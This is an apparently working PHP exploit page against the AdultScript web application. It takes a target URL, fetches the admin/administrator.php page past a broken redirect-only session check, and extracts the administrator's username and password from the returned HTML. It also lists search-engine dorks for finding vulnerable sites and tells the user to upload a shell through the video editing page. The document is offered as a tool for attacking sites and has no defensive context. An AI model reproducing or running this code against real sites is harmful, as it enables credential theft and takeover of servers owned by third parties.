<? ob_implicit_flush(true); ?>
<title>Adult Script Unauthorized Administrative Access Exploit</title>
<style>
body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}
input,
.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}
button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}  
textarea{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; border-left:1px solid #121212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}
a:link {
	color: #999999;
	text-decoration: none;
        font-weight: bold;
	background-color:#000000;
}
a:visited {
	color: #999999;
	text-decoration: none;
        font-weight: bold;
	background-color:#000000;
}
</style><br>

<h3>Adult Script Unauthorized Administrative Access Exploit</h3><br>
Exploit Coded By Liz0ziM From <a href="http://www.biyofrm.com">BiyoSecurityTeam</a><br>
Greetz My all friend and BiyoSecurityTeam User..
<br>
Software site: http://www.adultscript.net/<br>
Demo: http://www.adultscript.net/demo/<br>

Vulnerable code in <b>admin/administrator.php</b> near lines 5-8</b>

<pre>
( ($_SESSION['adminid']=="") && ($_SESSION['admintype'] !=1))
{
header("Location: logout.php"); // Bypass Me :D
} 
</pre>
<br>
<b>Dork</b>:<br>
inurl:submit-user-link.html<br>
inurl:video-listing-cat<br>
inurl:hosted-videos<br>
inurl:porn-listing-cat<br>
"Powered By AdultScript.NET"<br>
"Copyright 2007 [IAG].AdultScript.v1.5.Nulled"<br>
<br>
<form method="POST" action="">
<input name="adres" type="text" value="Target  example: http://www.site.com/" size="70" onFocus="if(this.value=='Target  example: http://www.site.com/')this.value=''" onBlur="if(this.value=='')this.value='Target  example: http://www.site.com/'">
<input name="yolla" type="submit" value="Send">
</form>

<br>
<?php
function dosya_indir($liz0){
		
		
		$ch = curl_init();
		$timeout = 0;
		curl_setopt ($ch, CURLOPT_URL, $liz0);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		$veri = curl_exec($ch);
		curl_close($ch);
		
		return $veri;

	}

$desen='|value="(.*)"|';

if($_POST[yolla])
{
$adres=$_POST[adres];

if(!eregi("http",$adres))
{
$adres="http://".$adres;
}
if($adres=="") { echo 'Bos Yerleri Doldurun'; exit(); }
echo 'Target= '.htmlspecialchars($adres)."<br>";
sleep(1);
echo 'Sending Evil Code.......<br>';
$kaynak=dosya_indir($adres."/admin/administrator.php");
sleep(5);

if(eregi('value="',$kaynak)) { 
echo "Exploit Has Been Succeful <br>";
preg_match_all($desen,$kaynak,$sonuc);
echo "<a target='_blank' href='".$adres."/admin/'>".$adres."/admin/</a><br>";
echo "<b>Username</b> :".htmlspecialchars($sonuc[1][0])."<br>";
echo "<b>Password</b>:".htmlspecialchars($sonuc[1][1])."<br>";
echo $adres."/admin/videolinks_view.php edit video and upload shell :)";
}
else
{
echo "Exploit Has Been Failed! <br>";
}


}
?>